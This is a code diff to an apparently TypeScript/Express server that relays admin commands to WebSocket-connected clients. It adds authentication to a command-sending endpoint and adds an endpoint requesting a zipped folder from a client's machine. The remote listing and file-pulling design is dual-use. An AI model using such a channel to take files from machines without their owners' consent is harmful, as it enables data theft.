@@ -236,7 +236,7 @@ wss.on("connection", (socket: WebSocket, req: IncomingMessage) => {
 });
 
 // Admin endpoint to send command to a client via WebSocket
-app.post("/api/commands/send", async (req, res) => {
+app.post("/api/commands/send", requireAuth, async (req, res) => {
   try {
     const { clientId, type, payload } = req.body as any;
     if (!clientId || !type)
@@ -253,6 +253,7 @@ app.post("/api/commands/send", async (req, res) => {
     res.status(500).json({ message: "Failed to send command" });
   }
 });
+
 // Admin convenience: request directory listing from client
 app.post("/api/commands/list", requireAuth, async (req, res) => {
   try {
@@ -299,5 +300,25 @@ app.post("/api/commands/file", requireAuth, async (req, res) => {
   } catch (e) {
     console.error(e);
     res.status(500).json({ message: "Failed to request file from client" });
+  }
+});
+
+// Admin convenience: request a folder zip from client
+app.post("/api/commands/folder", requireAuth, async (req, res) => {
+  try {
+    const { clientId, path: folderPath } = req.body as any;
+    if (!clientId || !folderPath)
+      return res.status(400).json({ message: "clientId and path required" });
+    const socket = clients.get(String(clientId));
+    if (!socket || socket.readyState !== 1)
+      return res.status(404).json({ message: "client not connected" });
+    const id = `${Date.now()}_${Math.random().toString(36).slice(2)}`;
+    const payload = { path: folderPath };
+    const cmd = { id, type: "folder", payload };
+    socket.send(JSON.stringify(cmd));
+    res.json({ ok: true, id });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ message: "Failed to request folder from client" });
   }
 });
